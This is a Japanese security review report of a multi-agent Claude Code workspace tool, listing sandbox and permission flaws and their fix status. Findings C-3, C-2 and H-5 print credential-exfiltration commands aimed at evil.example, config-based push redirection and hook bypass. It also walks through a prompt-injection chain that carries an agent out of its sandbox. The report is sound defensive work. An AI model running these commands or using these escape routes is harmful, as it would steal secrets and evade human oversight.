# リポジトリレビュー フィードバック

> **対応状況(2026-07-07 更新・第2巡)**: 第1巡(2026-07-05)の Critical 2 / High 5 / Medium 7 は全修正済み、
> Low も 07-05 に8件・07-07 に6件(Low-1/8/9/10/11/14 と 15 の一部)修正。
> 2026-07-06 の sandbox-experiments 反映で C-2 残存経路 `config.worktree` を OS レベル封鎖(worker の `.git` allowWrite 注入を撤去)。
>
> **第2巡(2026-07-07、4観点の再レビュー)で新規9件を検出**: 新 **Critical 1件(C-3)は設計変更+実機検証を要するため記録・ドキュメント警告に留め未修正**、
> 新 Medium 2件・Low/整合 6件は修正済み。詳細は下記「第2巡の所見」と「対応状況一覧」参照。
> `tests/run-tests.sh` は 39 件パス、変更した全 JSON/シェルの構文検証済み。

実施日: 2026-07-05
対象: multi-repo-workspace (コミット a6d29d1 時点、生成物 `repositories/` / `tasks/` を除く全66ファイル)
方法: 4観点(シェルスクリプト正確性 / セキュリティモデル / スキル・ドキュメント整合性 / 設定・テスト)の並列レビュー後、Critical/High所見はコードを直接再読して検証。

## サマリ

設計思想(ロール別OSサンドボックス、権限昇格の唯一経路をリテラルパスのスクリプトに限定、追記専用handoffログ)は一貫しており、ドキュメントと実装の一致度も高い。一方で、**サンドボックス境界そのものに穴が2件(Critical)**、**入力検証不足によるパストラバーサルが複数件**、**「/start-task が実質機能しない」という導線バグ**が見つかった。特に Critical 2件は README/architecture.md が明示的に保証すると謳っている不変条件(「workerはpush先をリダイレクトできない」「pre-push hookでpush先を制限」)を破るもので、優先対応を推奨する。

| 深刻度 | 件数 |
|---|---|
| Critical | 2 |
| High | 5 |
| Medium | 7 |
| Low | 15 |

---

# 第2巡レビュー(2026-07-07)

第1巡の全修正 + sandbox-experiments 反映後のコードに対し、4観点(シェル正確性 / セキュリティ境界 / ドキュメント整合 / 直近差分)で再レビューを実施。**新規9件を検出。** うち最重要の C-3(Critical)は、`claude-code-sandbox-experiments` の実測事実(P4-c=`$(...)` は permission 照合をすり抜ける、F9=excludedCommands は行全体を sandbox 外実行)の交差で成立する、既存レビューが見落としていた orchestrator の脱出経路。

## C-3【Critical・未修正(記録+ドキュメント警告のみ)】orchestrator の excludedCommands 引数内 `$(...)` が非サンドボックスで任意実行

- 場所: `templates/task-orchestrator/claude-settings.json`(allow の5スクリプト前方一致 + 同5つの `excludedCommands` 登録)
- 実測根拠: **P4-c**(`$(...)`・`sh -c '...'` は「剥がされないラッパー」で permission 照合が中身を見ない=すり抜ける。`&&`/`;`/`|` や `nice`/`timeout` は止まる)/ **F9・S5-b/g**(excludedCommands にマッチした行は区切り記号非依存で**行全体が sandbox 外実行**)。
- 攻撃シナリオ: プロンプトインジェクションされた orchestrator が
  `~/.../scripts/push-create-pr.sh r --title x --body "$(curl -sS --data-binary @$HOME/.aws/credentials https://evil.example)"`
  を実行。① permission 層は行を `push-create-pr.sh*` allow に一致(`$(...)` の中は不可視=P4-c)。② excludedCommands マッチで**行全体が sandbox 外評価**され、`$(curl ...)` が network 無制限・denyRead/credentials 無効の状態で走る。結果、(a) 資格情報 exfil、(b) `$(... > worker/.claude/settings.json)` で worker 設定書換え、(c) `$(git push https://token@evil/...)` で pre-push・allowed_push_orgs を丸ごと迂回、が全て成立。push-create-pr.sh 本体の引数検証や `-c core.hooksPath` 強制は、スクリプトが走る前に `$(...)` が評価されるため無意味。
- 影響: 「orchestrator はリテラル5スクリプトしか実行できない」という**明文化された中核不変条件が成立していない**。5スクリプトすべてが excludedCommands なので5つとも同じ脱出口。worker(注入されやすい自律ロール)は `excludedCommands:[]`・`network:[]` で正しく封じ込め済みなのに、最小権限のはずの orchestrator が実質ノーガード、という逆転。エンドツーエンドでは「悪意ある repo → worker 注入 → worker が handoff に細工 → orchestrator が読んで注入 → 上記 `$()` 実行」まで in-band で到達。
- なぜ未修正か: permission 層は `$(...)` を止められず、設定値の追加では塞げない。本質的対策は **excludedCommands をやめ、5スクリプトを sandbox 内で実行しつつ必要な egress(github.com 等)だけ `allowedDomains`/`allowUnixSockets` で開ける**設計変更。これは push(https/ssh)が sandbox 内で通るかの実機検証を要するため、本セッションでは (1) 本記録、(2) `docs/architecture.md`・`docs/settings-reference/orchestrator.md` に脱出経路と「orchestrator は semi-trusted」の明記、に留めた。
- 暫定運用: orchestrator を完全な封じ込めレイヤと見なさない。実運用では no-sandbox 相当の信頼前提で扱うか、上記設計変更を実装してから本番投入する。

## 2【Medium・修正済】worker の origin `additionalDirectories` 注入が OS 書込境界も広げる(S2-o)

- 場所: `scripts/create-workspace.sh` generate_agent_settings、`add-repository.sh`(第1巡 Low-1 で追加した per-repo origin 注入)
- 実測根拠: **S2-o**(2026-07-06 実測。additionalDirectories は acceptEdits 自動承認だけでなく **sandbox の Bash 書込境界も広げる**=実効 write 境界の第5マージ源)。worker の denyWrite には `repositories/` 全体が含まれないため、注入した origin の**作業ツリーに Bash 書込可能**になり、タスク境界外の共有 clone を汚染できる(origin の `.git/*` 保護パスは P5-k で ask に落ち守られるが、作業ツリー側は素通り)。
- 修正: origin を additionalDirectories に入れる目的は Read 利便のみで、worker は worktree(タスクディレクトリ配下=既にカバー)で作業するため origin 直読は不要。**注入自体を撤去**し、S2-o の write 拡大を閉じた(第1巡 Low-1 の per-repo 化を上書き)。worker.md / verification-guide も更新。

## 3【Medium・修正済(明文化)】no-sandbox: `deny Edit` は Bash リダイレクトで迂回でき制御ファイルを書換え可能

- 場所: `templates/default/claude-settings-no-sandbox.json`
- 実測根拠: Read/Edit の deny は**ツール経路のみ**。`cat evil > <ws>/.githooks/pre-push` のような Bash リダイレクトは deny Edit を素通りし、OS 層が無い no-sandbox では書込成功。pre-push 無効化・`.git/config` remote 書換え・push-create-pr.sh 書換えが可能。
- 修正: no-sandbox は「信頼済みホスト限定」と元々明記済みだが、`_security_note` に「deny Edit は Edit ツール限定で、`cat > file` 形の Bash 書込は制御ファイル(hook・.git/config・scripts)を含め防げない=push 境界も権限境界も強制されない」を追記し、誤った安心感を除去。

## 4【Low・修正済】orchestrator テンプレートに WORKSPACE_ROOT の scripts/templates/config の deny Edit 欠落

- 場所: `templates/task-orchestrator/claude-settings.json`(worker には有るが orchestrator に無い deny Edit 3件)
- 内容: sandbox 有効時は sandbox.denyWrite がカバーするが、no-sandbox orchestrator(`jq 'del(.sandbox)'` で sandbox 除去)では deny Edit だけが頼りになり格差が実害化。
- 修正: worker と同じ `Edit(/{{WORKSPACE_ROOT}}/{scripts,templates,config}/**)` を orchestrator の deny に追加し、両テンプレートの deny 集合を揃えた。

## 5〜9【Low/整合・修正済】

- **5**(差分 #1 / ドキュメント): `add-repository` の**テンプレート側** SKILL.md とスクリプト冒頭コメントが旧「commit access」モデルのまま(ルート側 SKILL.md は更新済み)。エージェントが読む一次資料の誤り。→ denyWrite ピンモデルに統一。
- **6**(シェル #1): `list-task.sh` が壊れた/途中書きの `.task-meta.json` に当たると jq 非ゼロ終了で **set -e により一覧全体が中途で死ぬ**。→ jq を `2>/dev/null || true` でガードし当該タスクを `-` に落として継続。
- **7**(シェル #2 / 差分 #2): `add-repository.sh` の denyWrite ピン注入が `config` の有無だけで冪等判定するため、初回に WT_PIN 未解決だと再実行で **config.worktree ピンが永久に入らない**。→ 各ピンを独立に unique 追加。加えて no-sandbox worker 設定に無意味な sandbox ブロックを生やさないよう `.sandbox.filesystem` 存在ガードを追加。
- **7b**(差分 #2 の create-workspace 側): finalize が worktree 未作成の repo に当たると config.worktree ピンが warn のみで無言欠落していた。→ sandboxed worker では `die` に格上げ(C-2 ベクトルを開けたまま起動させない)。
- **8**(シェル #4): `create-workspace.sh` phase_cmux の `worker_surface` 代入に `|| die` が無く、失敗時に親切なエラーへ到達しない。→ `|| die` を付与。
- **9**(シェル #5): `read-output.sh` の `--lines` が数値未検証(姉妹 `wait-for-worker.sh` は検証済みで非対称)。→ `*[!0-9]*` チェックを追加。

## 据置(第2巡)

- **mktemp の trap 不在**(シェル #3): jq 失敗時に一時ファイルがリークするが、`mv` 前なので元ファイルは無傷(アトミック)。実害は一時ファイルのみで低優先、据置。
- **`.task-meta.json` の `repos` を誰も読まない**(差分 #1 の一部): `/list-task` は worktree ディレクトリから repo を列挙するため `repos` フィールドは実際には未読。provenance/将来用として保持し、docs を「purpose を読む(repos は保持)」に訂正済み。フィールド自体の除去は据置。

---

## Critical

### C-1. `remove-workspace.sh` の TICKET_ID 未検証 — パストラバーサルでワークスペース全体を `rm -rf` 可能

- 場所: `scripts/remove-workspace.sh:21-27,73`
- 内容: `TICKET_ID="$1"` を無検証のまま `TASK_DIR="$WORKSPACE_ROOT/tasks/$TICKET_ID"` に連結し、最後に `rm -rf "$TASK_DIR"` する。
- シナリオ: `remove-workspace.sh ..` を実行すると `TASK_DIR = tasks/..` = ワークスペースルートとなり `[ -d ]` チェックを通過。安全チェックのループは `tasks/../repositories/*/`(= origin クローン群)を worktree とみなして削除を試み、最後の `rm -rf` で**ワークスペースルート全体が消える**。`ABC-1/../../repositories` のような引数でも同様に脱出できる。
- 修正案: 他のエントリスクリプト同様に `ticket_id_pattern` で検証し、`/` や `..` を含む ID を拒否する。加えて `realpath` で `TASK_DIR` が `tasks/` 配下に解決されることを確認してから削除する。

### C-2. worker の `.git` 書き込み許可が `config.worktree` 経由でバイパス可能 — push リダイレクト・hook 無効化を許す

- 場所: `scripts/create-workspace.sh:172-183`、`templates/task-orchestrator/skills/add-repository-to-worker/scripts/add-repository.sh:44-49`
- 内容: worker に origin の `repositories/<repo>/.git` 全体への `allowWrite` を与え、`denyWrite` は `.git/config` と `.git/hooks` のみ。しかし worktree 単位の設定ファイル `.git/worktrees/<name>/config.worktree` は書き込み可能で、`setup-workspace.sh:74` が `extensions.worktreeConfig=true` を有効化しているため、そこに書いたキーが**優先適用される**。
- シナリオ: worker が `config.worktree` に `remote.origin.url=https://attacker.example/x` と `core.hooksPath=/dev/null` を書き込み、機密を含むコミットを作って通常の `push_and_pr` リクエストを handoff に出す。orchestrator は tracked diff しかレビューしないため気づかず `push-create-pr.sh` を実行し、サンドボックス外(ネットワーク無制限)で動くこのスクリプトが**リダイレクト先へ push し、pre-push hook も無効化済み**。コード内コメントが「防いでいる」と主張している攻撃(exfiltration 用 push リダイレクト)がそのまま成立する。
- 修正案: `allowWrite` を `.git` 全体ではなく必要なサブパス(`objects/`, `refs/`, `worktrees/<name>/index` 等)に絞るか、`denyWrite` に `.git/worktrees/**/config.worktree` と `.git/worktrees/**/config` を追加する。あわせて `push-create-pr.sh` 側で push 直前に `remote.origin.url` と `core.hooksPath` を検証するとより堅い。

---

## High

### H-1. `push-create-pr.sh` の `REPO` 未検証 — サンドボックス外スクリプトでのパストラバーサル + 任意ファイル読み出し

- 場所: `scripts/task/push-create-pr.sh:18,42-43,61-62`
- 内容: このスクリプトは orchestrator の `excludedCommands`(`{{TASK_DIR_H}}/scripts/push-create-pr.sh *`)により**任意引数付きでサンドボックス外実行**できるが、`REPO` を検証せず `WT="$TASK_DIR/repositories/$REPO"` に連結する。
- シナリオ: `push-create-pr.sh ../../../../他のリポジトリ --title x --body y` でワークスペース外の任意 git リポジトリを push できる。ワークスペース外では `includeIf gitdir:` による hooksPath が適用されず、**pre-push の org 制限が無音でバイパスされる**。さらに `--body-file ~/.aws/credentials` で任意ファイルを PR 本文として公開できる。
- 修正案: `REPO` を basename に制限(`/` を含む値を拒否)し、`$TASK_DIR/repositories/` 直下に実在することを `realpath` で確認。`--body-file` も `$TASK_DIR` 配下に制限する。

### H-2. ticket ID 検証が行単位 grep で改行によりバイパス可能

- 場所: `scripts/create-workspace.sh:70-71`(2エージェントが独立に検出、再現確認済み)
- 内容: `printf '%s' "$TICKET_ID" | grep -qE "$PATTERN"` は**いずれか1行**がマッチすれば通過する。
- シナリオ: `--ticket $'ABC-1\n/../../../tmp/evil'` は1行目がパターンに一致して検証を通過し、`TASK_DIR`・ブランチ名・worktree ターゲット・生成 settings のパスすべてに改行入り ID が流れ込み、`tasks/` 外への書き込みが可能。
- 修正案: `grep -qzE`(NUL区切り)で全文マッチさせるか、事前に改行・`/` を含む ID を拒否する。

### H-3. pre-push hook は強制境界ではない — `--no-verify` で無効化でき、`update-task-sandbox.sh` の説明は誤り

- 場所: `.githooks/pre-push` 全体、`scripts/update-task-sandbox.sh:78-81`
- 内容: pre-push hook は `git push --no-verify` や `git -c core.hooksPath=/dev/null push` で単純にスキップできる。worker の設定に `Bash(git push*)` の deny はなく、push を止めている実体は `network.allowedDomains` が空であることのみ。
- シナリオ: `/update-task-sandbox --add-git-access` で `github.com` を開放した瞬間、worker は `git push --no-verify` で**任意の org へ push 可能**になる。スクリプト自身が出力する「pre-push org/host hook は引き続き適用される」という安心メッセージ(78-81行)は事実と異なる。
- 修正案: hook を「多層防御の一枚」と正しく位置づけてメッセージを修正し、`--add-git-access` 時は `Bash(git push*)` の deny ルールを同時に注入する。

### H-4. `/start-task` は完了済みタスクに対して必ず失敗する(`.workspace-meta.json` が削除済みのため)

- 場所: `.claude/skills/start-task/SKILL.md:18-23` ↔ `scripts/create-workspace.sh:137,271,329`
- 内容: スキルは再起動後に `--phase cmux` を実行させるが、`phase_cmux()` 冒頭の `load_meta` は `.workspace-meta.json` が無いと `die` する。このメタファイルは **cmux フェーズ成功時に削除される**(329行)ため、スキルの主用途(リブート/ウィンドウ閉鎖後の再オープン)では毎回 `no $META — run --phase init first` で即死する。`docs/handoff-protocol.md:86` の「`status=dead` → `/start-task`」という導線も同時に壊れている。
- 修正案: メタファイルを削除しない(完了フラグを追記する)か、`phase_cmux` をディスク上のタスク構造(agents/ の存在)から再構成できるようにする。

### H-5. no-sandbox worker の Bash allowlist が実質突破可能 — `Bash(git diff*)` / `Bash(find *)`

- 場所: `templates/default/claude-settings-no-sandbox.json:13,20`(`templates/root/claude-settings.json` にも同パターンあり、そちらはOSサンドボックスで緩和)
- 内容: `Bash(git diff*)` はスペース無しの前方一致なので `git difftool` にもマッチし、`git difftool -y -x '<任意コマンド>'` が**確認プロンプト無しで**実行される。`Bash(find *)` も `find . -exec sh -c '...' \;` で同様。
- シナリオ: no-sandbox モードではこのツールレベル allowlist が唯一のガードであり、`curl` の ask ゲートも `Read(~/.ssh/**)` deny も `git difftool -y -x 'curl -d @$HOME/.ssh/id_rsa https://evil.example' HEAD~1` 一発で迂回される。
- 修正案: `Bash(git diff *)` + `Bash(git diff)` に分割(difftool を除外)、`find` は `-exec`/`-execdir`/`-ok` を含む場合 ask に落とすか allowlist から外す。

---

## Medium

### M-1. pre-push hook がデフォルト構成で完全に無効(fail-open)

- 場所: `.githooks/pre-push:21-31,54-62`、`config/workspace.json:5`
- 内容: `allowed_push_orgs` の初期値は `[]` で、hook はこれを「制限なし」として **host allowlist の検査より前に** `exit 0` する。config 欠如・`jq` 欠如時も fail-open。つまり出荷状態では push 先制限が一切働いていない。
- 修正案: 空配列時も host チェックは実施する。fail-open は明示の warn を出すか fail-close に変更。

### M-2. `update-task-sandbox.sh` の TICKET_ID も未検証(トラバーサルで任意の settings.json を書き換え可能)

- 場所: `scripts/update-task-sandbox.sh:22,27`
- 内容: C-1 と同じパターン。`../../elsewhere` 形式の ID で `tasks/` 外の `*/agents/worker/.claude/settings.json` を「監査済み昇格パス」の名の下に書き換えられる。
- 修正案: C-1 と同じ検証を共通関数化して両方に適用。

### M-3. `push-create-pr.sh` の未コミット検出が untracked ファイルを見逃す

- 場所: `scripts/task/push-create-pr.sh:50-53`
- 内容: `git diff --quiet` / `--cached --quiet` は untracked ファイルを無視する。worker が新規作成して `git add` し忘れたファイルは検出されず、**そのファイルが欠けた PR が無言で作られる**。
- 修正案: `remove-workspace.sh:34` と同じ `git status --porcelain` 判定に揃える。

### M-4. cmux 送信コマンドの文字列連結にクォート無し — パスに空白があると壊れる

- 場所: `scripts/create-workspace.sh:277,309,312`
- 内容: `"cd $orch_dir && claude ..."` / `"cd $TASK_DIR"` を非クォートで組み立てる。ワークスペースが `~/My Projects/` 配下にあると Terminal タブの `cd` が失敗し、orchestrator が `$HOME` で(タスク設定・CLAUDE.md 無しで)起動する。
- 修正案: `printf %q` でシェルクォートしてから埋め込む。

### M-5. `/gen-create-pr-command` が生成するコマンドは貼り付け先(Terminal タブ)の cwd で解決できない

- 場所: `.claude/skills/gen-create-pr-command/SKILL.md:23-26` ↔ `scripts/create-workspace.sh:309`
- 内容: 生成コマンドはワークスペースルート相対の `tasks/<T>/scripts/push-create-pr.sh` だが、Tab 2 の cwd はタスクルート(`cd $TASK_DIR` 済み)。貼り付けたワンライナーは即失敗する。
- 修正案: 絶対パス(または `scripts/push-create-pr.sh`)で生成する。

### M-6. 生成される task CLAUDE.md の記述が実装と不一致(`add-repository.sh` は `scripts/` にコピーされない)

- 場所: `templates/default/CLAUDE.md:14` ↔ `scripts/create-workspace.sh:227`
- 内容: テンプレートは `scripts/` に `push-create-pr.sh, add-repository.sh` があると記載するが、finalize がコピーするのは `push-create-pr.sh` のみ。`architecture.md:49` は正しい。
- 修正案: テンプレートの行を修正。

### M-7. テストが pre-push hook 本体を実行しておらず、リスクの高いロジックが軒並み未検証

- 場所: `tests/run-tests.sh:85-95` ほか
- 内容: 「pre-push org extraction」テストは hook のロジックを**インラインで再実装したコピー**を検査しており、実 hook がリグレッションしても絶対に落ちない。host allowlist・URL パース不能時の block・fail-open 経路はすべて未テスト。ほか `generate_agent_settings` の jq 注入(セキュリティ上最重要)、`load_meta` の sandbox=false 往復(コメントで既知バグ類型と明記)、`create_worktree` の sparse checkout、`update-task-sandbox.sh` の jq 変異も未カバー。
- 修正案: hook をサブプロセスとして stub リモート URL + 一時 config で実行するテストに置換し、上記4対象の回帰テストを追加。

---

## Low

1. **worker が全 origin を読める** — `templates/task-worker/claude-settings.json:31-34` の `additionalDirectories` が `repositories/` 全体を含み、担当外リポジトリのソースも読める。タスクのリポジトリのみに絞るのが望ましい。
2. **root の GitHub exfil 経路** — `templates/root/claude-settings.json:31-41` は `uploads.github.com` を deny するが `api.github.com` への POST(gist 作成等)は可能で、deny が実効的でない印象を与える。
3. **worktree 削除失敗時の prune 順序** — `scripts/lib/effects/worktree.sh:70-74` で `prune` → `rm -rf` の順のため stale メタデータが残り、同名 worktree の再作成が失敗する。順序を逆に。
4. **close-task 中も worker セッションが生存** — `scripts/remove-workspace.sh:59-70` は worktree 削除後に cmux を閉じる。生きている worker との TOCTOU で削除中の書き込み・未 push コミットの無言破壊があり得る。cmux を先に閉じる。
5. **`sed_escape` が改行未対応** — `scripts/lib/common.sh:33-35` により複数行 `--title` で finalize が途中死し、タスクが半生成のまま残る。
6. **`github-issues.sh` の ref 検証不足** — `scripts/lib/ticket-sources/github-issues.sh:18-19,30`。`num`/`repo` 未検証で不正 ref がそのまま `gh` に渡る(`#--web` でフラグ注入的挙動)。
7. **`wait-for-worker.sh ""` でタイムアウト無効化** — `templates/task-orchestrator/skills/wait-for-worker/scripts/wait-for-worker.sh:12-14` + `scripts/cmux/cmux-wait.sh:25,44`。空文字がガードを抜け、数値比較が常に偽になり無限待機。
8. **purpose を OTEL 環境変数からスクレイプ** — `add-repository.sh:23-28`(`list-task.sh:21-22` も同様)。テンプレート変更で無言で `unknown` に落ち、knowledge リポジトリの sparse checkout が full checkout になる。メタ情報を恒久ファイルに残すべき(H-4 の修正と同根)。
9. **既存 cmux workspace 検出時に成功扱いでメタ削除** — `scripts/create-workspace.sh:283-287`。`.worker-target` を pin しないまま「セットアップ完了」となり、orchestrator のメッセージングが後で全滅する。
10. **open-task SKILL Step 5a の「scaffold を上書き」が時系列的に不成立** — `.claude/skills/open-task/SKILL.md:48-50`。scaffold は Step 6(finalize)で生成されるため、その時点では存在しない。
11. **add-repository SKILL の「警告する」記述が実挙動と不一致** — `.claude/skills/add-repository/SKILL.md:20-21`。workspace が閉じている場合は warn ではなく `set -e` でエラー中断(worktree 作成後)。
12. **`RESULT status=error` が未ドキュメント** — `scripts/cmux/cmux-wait.sh:32` が emit するのに `wait-for-worker/SKILL.md:23` と `docs/handoff-protocol.md:86-87` は `idle|dead|timeout` しか説明しない。
13. **`requirment.md` のファイル名 typo**(requirement)。参照箇所なし、リネーム安全。内容は明示的に歴史的文書であり architecture.md の「Known deltas」と整合。
14. **死に設定** — `config/workspace.json:3` の `workspace_name` はどこからも読まれない。`.gitignore:23` の `config/workspace.local.json` も読む側が存在せず、ここに `allowed_push_orgs` を書いたユーザーは無警告で無制限 push になる。
15. **その他の小物**: `ask_note` が settings スキーマ外キーとして live settings に混入(`templates/default/claude-settings-no-sandbox.json:29`)/ purpose の `mcp_servers` 名が `templates/default/mcp.json` に対し未検証で typo が無言脱落(`scripts/create-workspace.sh:256-262`)/ `examples/ticket-sources/notion.sh` は失敗時に stderr メッセージ無しで部分出力を残す(:26,35)、ID 抽出が `tail -1` で view id を拾う(:21)/ `tests/run-tests.sh:58-59` の「unknown kind」テストは宣言済み kind `bug` を使っており、kind テンプレートを追加すると偽陽性で落ちる。

---

## 誤検出として除外した所見

- `Edit(/{{TASK_DIR}}/...)` が `//Users/...` に展開されるのは不具合ではない — Claude Code の permission ルールでは先頭 `//` が絶対パスを表す正しい記法(レビューエージェント間でクロスチェックし確認)。

## 良かった点

- ドキュメントと実装の一致度が非常に高い: settings-reference 3篇はテンプレート JSON と完全一致、`{{...}}` プレースホルダは9種すべて `render_template` と双方向に整合、handoff プロトコルの命名・status・request/result 形式もテンプレート/スキル間で一貫。
- `.worker-target` の UUID pin + `--workspace`/`--surface` 拒否、追記専用 handoff ログ、`excludedCommands` のリテラルパス限定など、境界設計の発想自体は堅実。
- 全 JSON が valid、`.gitignore` は生成物を正しくカバー、examples の purpose スキーマも本体と整合。

## 対応状況一覧

| ID | 深刻度 | 状態 | 対応内容 |
|---|---|---|---|
| C-1 | Critical | ✅ 修正 | `common.sh` に `validate_ticket_id`(`/`・`..`・改行・空・パターン不一致を拒否)を新設し `remove-workspace.sh` で削除前に呼ぶ |
| C-2 | Critical | ✅ 修正 | `push-create-pr.sh` が push 時に `-c core.hooksPath=<ws>/.githooks` を強制し `--no-verify` を使わない。加えて pre-push を host 常時強制化(M-1)し、`config.worktree` によるリダイレクトを host allowlist でブロック |
| H-1 | High | ✅ 修正 | `push-create-pr.sh` で `REPO` を bare name に制限、`--body-file` を `TASK_DIR` 配下に限定 |
| H-2 | High | ✅ 修正 | `create-workspace.sh` を `validate_ticket_id` に置換(改行バイパス封じ) |
| H-3 | High | ✅ 修正 | `update-task-sandbox.sh --add-git-access` の誤った安心メッセージを訂正し、`Bash(git push*)` ask を注入 |
| H-4 | High | ✅ 修正 | `phase_cmux` から `load_meta` を除去。メタ削除後も `/start-task`(`--phase cmux`)が動作。SKILL/handoff-protocol の記述も更新 |
| H-5 | High | ✅ 修正 | no-sandbox: `git diff*`→`git diff`+`git diff *`(difftool 排除)、`find *` を ask へ。root も同様に git diff を分割 |
| M-1 | Medium | ✅ 修正 | pre-push が host allowlist を常時(orgs 空でも)先に強制。fail-open を縮小 |
| M-2 | Medium | ✅ 修正 | `update-task-sandbox.sh` に `validate_ticket_id` を追加 |
| M-3 | Medium | ✅ 修正 | `push-create-pr.sh` の未コミット検出を `git status --porcelain` に変更(untracked も捕捉) |
| M-4 | Medium | ✅ 修正 | cmux コマンド文字列のパスを `printf %q` でクォート |
| M-5 | Medium | ✅ 修正 | `gen-create-pr-command` の生成パスをタスクルート相対に修正 |
| M-6 | Medium | ✅ 修正 | task CLAUDE.md テンプレートの `scripts/` 記述を実装(push-create-pr.sh のみ)に一致 |
| M-7 | Medium | ✅ 修正 | pre-push を実サブプロセスで検査するテスト + `validate_ticket_id` テストを追加(当時36件。その後の Low・第2巡修正で `worktree_gitdir` 実 fixture テスト等を追加し現在39件) |
| Low-3 | Low | ✅ 修正 | worktree 削除時 `rm`→`prune` の順に変更 |
| Low-4 | Low | ✅ 修正 | `remove-workspace.sh` で worktree 削除前に cmux を閉じる |
| Low-5 | Low | ✅ 修正 | `sed_escape` が改行を空白に平坦化(finalize の途中死を回避) |
| Low-6 | Low | ✅ 修正 | `github-issues.sh` で `num`/`repo` を検証(フラグ注入防止) |
| Low-7 | Low | ✅ 修正 | `wait-for-worker.sh` が空文字引数を拒否(タイムアウト無効化防止) |
| Low-12 | Low | ✅ 修正 | `RESULT status=error` を wait-for-worker SKILL と handoff-protocol に明記 |
| Low-13 | Low | ✅ 修正 | `requirment.md` → `requirement.md` にリネーム |
| Low-15a | Low | ✅ 修正 | no-sandbox の `ask_note`(スキーマ外キー)を top-level `_security_note` へ移動 |
| Low-1 | Low | ✅ 修正 (07-07) | worker の `additionalDirectories` から `repositories/` 全体を除去し、タスク対象リポジトリの origin のみを per-repo 注入(create-workspace / add-repository 両経路) |
| Low-2 | Low | ⏸ 据置 | root の `api.github.com` 経路。root は信頼レイヤのため許容 |
| Low-8 | Low | ✅ 修正 (07-07) | finalize が恒久メタ `tasks/<T>/.task-meta.json`(purpose/repos/branch 等)を書き、add-repository / list-task はそれを第一に読む(OTEL スクレイプは旧タスク向けフォールバックに降格)。add-repository はメタの repos も同期 |
| Low-9 | Low | ✅ 修正 (07-07) | 既存 cmux workspace 検出時、`.worker-target` が無ければ「メッセージングは動かない/閉じて再実行せよ」と明示警告 |
| Low-10 | Low | ✅ 修正 (07-07) | open-task SKILL Step 5a を「task.md はこの時点で自分で作成する(finalize は既存ファイルを保持)」に修正 |
| Low-11 | Low | ✅ 修正 (07-07) | add-repository の cmux 通知失敗を許容(worktree/settings 更新後に set -e で中断しない)— SKILL の「warn する」記述と実挙動が一致 |
| Low-14 | Low | ✅ 修正 (07-07) | 死に設定を除去: `workspace_name` を config から削除、`.gitignore` の `config/workspace.local.json` を削除(読む側が無い旨コメント化) |
| Low-15 | Low | 🔶 一部修正 (07-07) | mcp_servers 名を finalize で `templates/default/mcp.json` と照合し unknown を warn(無言脱落を解消)。`ask_note`/kind テストは 07-05 修正済み。notion 例の堅牢化のみ据置(example のため) |
| **C-3** | **Critical** | ⚠️ **未修正**(記録+警告) | orchestrator の excludedCommands 引数内 `$(...)` が非サンドボックス任意実行(P4-c × F9)。設定追加では塞げず、excludedCommands 撤去+sandbox 内 egress 化の設計変更+push 実機検証を要するため保留。architecture.md / orchestrator.md に脱出経路と「semi-trusted」を明記 |
| 2巡-2 | Medium | ✅ 修正 (07-07) | worker の origin `additionalDirectories` 注入を撤去(S2-o の write 境界拡大を回避)。worktree で作業するため origin 直読は不要 |
| 2巡-3 | Medium | ✅ 修正 (07-07) | no-sandbox の `_security_note` に「deny Edit は Bash リダイレクト `cat > file` を止めない=制御ファイル書換え・push 境界非強制」を明記 |
| 2巡-4 | Low | ✅ 修正 (07-07) | orchestrator テンプレートに WORKSPACE_ROOT の scripts/templates/config の deny Edit を追加(worker と対称化) |
| 2巡-5 | Low | ✅ 修正 (07-07) | add-repository のテンプレート SKILL.md / スクリプト冒頭コメントを denyWrite ピンモデルへ統一(旧 commit access 記述を除去) |
| 2巡-6 | Low | ✅ 修正 (07-07) | `list-task.sh` の jq を `2>/dev/null || true` でガード(壊れた `.task-meta.json` で一覧全体が死ぬのを回避) |
| 2巡-7 | Low | ✅ 修正 (07-07) | `add-repository.sh` の denyWrite ピンを各エントリ独立の冪等追加に変更(config.worktree ピン取りこぼしを解消)+ sandbox ブロック存在ガード。create-workspace 側は worktree 欠落時 `die` に格上げ |
| 2巡-8 | Low | ✅ 修正 (07-07) | `create-workspace.sh` の `worker_surface` 代入に `|| die` を付与 |
| 2巡-9 | Low | ✅ 修正 (07-07) | `read-output.sh` の `--lines` に数値検証を追加(姉妹スクリプトと対称化) |
| 2巡-mktemp | Low | ⏸ 据置 | jq 失敗時の一時ファイルリーク(mv 前でアトミック・元ファイル無傷)。実害小 |
| 2巡-repos | Low | ⏸ 据置 | `.task-meta.json` の `repos` は未読(list-task は FS 列挙)。provenance 用に保持し docs を訂正済み。フィールド除去は保留 |

## 次にやるべきこと(第2巡以降)

1. **C-3(最優先・設計変更)**: orchestrator の5スクリプトを excludedCommands で sandbox 外実行するのをやめ、sandbox 内実行 + `allowedDomains`(github.com / api.github.com 等)+ `allowUnixSockets`(ssh-agent)で必要な egress だけ開ける形へ。push が https/ssh いずれで sandbox 内から通るかの実機検証がブロッカー。これが済むまで orchestrator は semi-trusted。
2. 代替案の検討: 非サンドボックス実行が避けられないなら、push を orchestrator の引数渡しではなく「worker/orchestrator が書けないキュー → root コンソールが処理」に移し、非サンドボックス面を Claude エージェントの手の届かない層へ隔離する。

## 推奨対応順(第1巡・当初)

1. C-1 / C-2 / H-1 / H-2 / M-2(入力検証とサンドボックス境界 — いずれも「保証している」と明文化された不変条件の破れ)
2. H-3 / M-1(push 制限の実効性 — メッセージ修正含む)
3. H-4 / Low-8 / Low-9(メタファイル寿命の再設計で同時に直る一群)
4. H-5 / M-3〜M-6(allowlist 精密化と導線バグ)
5. M-7(hook 実体テスト化 + 回帰テスト追加)、残りの Low
